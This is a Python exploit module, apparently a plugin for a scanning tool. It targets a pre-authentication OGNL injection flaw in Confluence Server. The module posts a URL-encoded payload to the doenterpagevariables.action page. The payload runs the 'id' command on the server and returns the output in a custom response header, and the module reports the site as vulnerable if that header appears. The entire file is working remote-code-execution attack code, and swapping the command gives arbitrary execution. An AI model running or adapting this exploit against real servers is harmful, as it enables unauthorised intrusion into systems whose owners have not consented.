import requests
from core.printmodels import *
import re

class Confluence_PreAuth_OGNL:
    def __init__(self):
        self.name = "Confluence Pre-Auth OGNL"
        self.description = "Confluence Server Pre-Auth OGNL Injection"
        self.author = "Mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D"
            target = f"{site}/pages/doenterpagevariables.action"
            data = f"queryString={payload}"
            
            response = requests.post(target, headers=headers, data=data, verify=False, timeout=10)
            
            if "X-Cmd-Response" in response.headers:
                return PrintSuccess(f"[Confluence-PreAuth] Vulnerable to OGNL injection!")
            return PrintFailed("[Confluence-PreAuth] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Confluence-PreAuth] Error: {str(e)}")
